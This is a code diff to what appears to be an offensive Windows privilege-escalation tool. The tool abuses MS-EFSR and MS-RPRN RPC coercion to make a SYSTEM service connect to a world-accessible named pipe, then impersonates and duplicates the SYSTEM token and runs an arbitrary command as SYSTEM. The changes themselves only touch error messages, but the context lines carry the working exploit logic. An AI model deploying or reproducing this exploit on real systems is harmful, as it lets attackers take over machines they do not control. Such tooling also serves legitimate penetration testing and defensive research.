@@ -18,6 +18,7 @@
 
 #include "lib/ms-efsr_h.h"
 #include "lib/ms-rprn_h.h"
+#include "win32errorcodes/c/win32errors.h"
 #include "CoerceFunctions.h"
 #include "CLI11.hpp"
 
@@ -53,16 +54,16 @@ void handleError(long result) {
         wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
     else if (result == 5) {
-        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
+        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one ...\r\n");
     }
     else if (result == 50) {
-        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
+        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one ...\r\n");
     }
     else if (result == 0) {
         wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
     else {
-        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
+        wprintf(L" -> [-] Exploit failed, unknown error, trying another function ...\r\n");
     }
 }
 
@@ -119,19 +120,19 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!ImpersonateNamedPipeClient(hPipe))
     {
-        wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
+        wprintf(L"Error ImpersonateNamedPipeClient() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
-        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
+        wprintf(L"Error OpenThreadToken() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
-        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        wprintf(L"Error DuplicateTokenEx() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
@@ -139,7 +140,7 @@ BOOL GetSystem(HANDLE hPipe)
     {
         if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
         {
-            wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
+            wprintf(L"Error SetTokenInformation() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
             goto cleanup;
         }
     }
@@ -152,13 +153,13 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
-        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+        wprintf(L"Error GetSystemDirectory() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
     {
-        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+        wprintf(L"Error CreateEnvironmentBlock() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
@@ -178,7 +179,7 @@ BOOL GetSystem(HANDLE hPipe)
             {
                 if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                 {
-                    wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
+                    wprintf(L"Error CreateProcessWithTokenW() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
                     goto cleanup;
                 }
                 else
@@ -194,7 +195,7 @@ BOOL GetSystem(HANDLE hPipe)
         }
         else
         {
-            wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
+            wprintf(L"Error CreateProcessAsUser() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
             goto cleanup;
         }
     }
@@ -246,23 +247,23 @@ DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
 
     if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
     {
-        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
+        wprintf(L"Error InitializeSecurityDescriptor() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         return -1;
     }
 
     if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
     {
-        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
+        wprintf(L"Error ConvertStringSecurityDescriptorToSecurityDescriptor() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         return -1;
     }
 
     if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
     {
-        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
+        wprintf(L"[PIPESERVER] Named pipe '%ls' listening ...\n\n", lpName);
         ConnectNamedPipe(hPipe, NULL);
         wprintf(L"\n[PIPESERVER] A client connected!\n\n");
         if (!GetSystem(hPipe)) {
-            wprintf(L"[PIPESERVER] CreateNamedPipe() failed. Error: %d - ", GetLastError());
+            wprintf(L"[PIPESERVER] Error CreateNamedPipe() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
         }
     }
     return 0;
@@ -281,7 +282,7 @@ BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
 long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, std::wstring randomNamedpipe)
 {
     long result;
-    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
+    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions ...\r\n\n");
 
     LPWSTR targetedPipeName;
     std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
@@ -313,7 +314,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
     };
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
     if (exploitID == -1) {
-        wprintf(L"[MS-EFSR] Starting RPC functions fuzzing...\r\n");
+        wprintf(L"[MS-EFSR] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
             wprintf(L" [MS-EFSR] ");
             result = functions[i]();
@@ -339,7 +340,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
 
 long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) {
     long result;
-    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
+    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions ...\r\n\n");
     LPWSTR targetedPipeName;
     std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
     targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t));
@@ -355,7 +356,7 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
     } };
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
     if (exploitID == -1) {
-        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing...\r\n");
+        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing ...\r\n");
         for (int i = 0; i < sizeOfFunctions; i++) {
             wprintf(L" [MS-RPRN] ");
             result = functions[i]();
@@ -376,7 +377,7 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
 
     LocalFree(targetedPipeName);
     if (!force) {
-        wprintf(L"[MS-RPRN] None of MS-RPRN worked... \r\n\n\n");
+        wprintf(L"[MS-RPRN] None of MS-RPRN worked ...\r\n\n\n");
     }
     return -1;
 }
@@ -390,7 +391,7 @@ BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force, std::wstring ran
     StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\srvsvc");
 
     if (!createNamedPipe(namedpipe, command)) {
-        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
+        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server.\r\n");
         return FALSE;
     }
 
@@ -398,7 +399,7 @@ BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force, std::wstring ran
 
     handle_t RPCBind;
     if (!createRPCbind(RPCBind)) {
-        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
+        wprintf(L"[RPCBIND] An error has occurred during the RPC binding.\r\n");
         return FALSE;
     }
     Sleep(500);
@@ -417,7 +418,7 @@ BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force, std::wstring ran
 
 
     if (!createNamedPipe(namedpipe, command)) {
-        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
+        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server.\r\n");
         return FALSE;
     }
     Sleep(500);
@@ -490,7 +491,7 @@ int main(int argc, char** argv)
     if (rpcInterface.empty() and exploitId != -1) {
         wprintf(L"%d\n", exploitId);
         wprintf(L"Please use rpcInterface parameter before defining exploitId. \r\n");
-        wprintf(L"[-] Exiting...\r\n");
+        wprintf(L"[-] Exiting ...\r\n");
         exit(0);
     }
 
@@ -566,7 +567,7 @@ handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
     RpcStringFreeW(&StringBinding);
 
     if (RpcStatus != RPC_S_OK) {
-        wprintf(L"[-] An error has occurred during STRING_HANDLE_bind()...\r\n");
+        wprintf(L"[-] An error has occurred during STRING_HANDLE_bind() ...\r\n");
         return(0);
     }
 
@@ -578,7 +579,7 @@ void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle
     RPC_STATUS       RpcStatus;
 
     RpcStatus = RpcBindingFree(&BindingHandle);
-    if (RpcStatus == RPC_S_INVALID_BINDING) wprintf(L"[-] An error has occurred during STRING_HANDLE_unbind()...\r\n");
+    if (RpcStatus == RPC_S_INVALID_BINDING) wprintf(L"[-] An error has occurred during STRING_HANDLE_unbind() ...\r\n");
 
     return;
 }
